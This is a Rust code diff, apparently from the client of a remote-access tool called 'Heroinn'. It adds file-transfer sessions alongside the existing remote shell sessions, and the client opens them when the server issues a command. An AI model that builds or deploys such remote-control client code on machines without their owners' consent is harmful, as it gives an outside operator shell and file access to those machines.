@@ -11,6 +11,8 @@ mod module;
 
 use module::Shell::ShellClient;
 
+use crate::module::ftp::FtpClient;
+
 lazy_static!{
     static ref G_OUT_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
     static ref G_IN_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
@@ -24,15 +26,20 @@ fn main() {
     let clientid = Uuid::new_v4().to_string();
 
     let shell_session_mgr : SessionManager<ShellClient> = SessionManager::new();
-
     let shell_session_mgr = Arc::new(Mutex::new(shell_session_mgr));
+
+    let ftp_session_mgr : SessionManager<FtpClient> = SessionManager::new();
+    let ftp_session_mgr = Arc::new(Mutex::new(ftp_session_mgr));
     
     let shell_session_mgr_1 = shell_session_mgr.clone();
+    let ftp_session_mgr_1 = ftp_session_mgr.clone();
     std::thread::spawn(move || {
         loop{
             std::thread::sleep(Duration::from_secs(HEART_BEAT_TIME));
-            let mut session = shell_session_mgr_1.lock().unwrap();
-            session.gc();
+            let mut shell_session = shell_session_mgr_1.lock().unwrap();
+            let mut ftp_session = ftp_session_mgr_1.lock().unwrap();
+            shell_session.gc();
+            ftp_session.gc();
         }
     });
 
@@ -210,7 +217,9 @@ fn main() {
                             shell_session_mgr.lock().unwrap().register(session);
                         },
                         HeroinnServerCommandID::File => {
-
+                            let msg = Message::new(client.local_addr().unwrap() , HeroinnProtocol::TCP , &buf).unwrap();
+                            let session = FtpClient::new_client(session_sender.clone(), &clientid , &msg.parser_sessionpacket().unwrap().id).unwrap();
+                            ftp_session_mgr.lock().unwrap().register(session);
                         },
                         HeroinnServerCommandID::SessionPacket => {
                             let msg = Message::new(client.local_addr().unwrap() , HeroinnProtocol::TCP , &buf).unwrap();
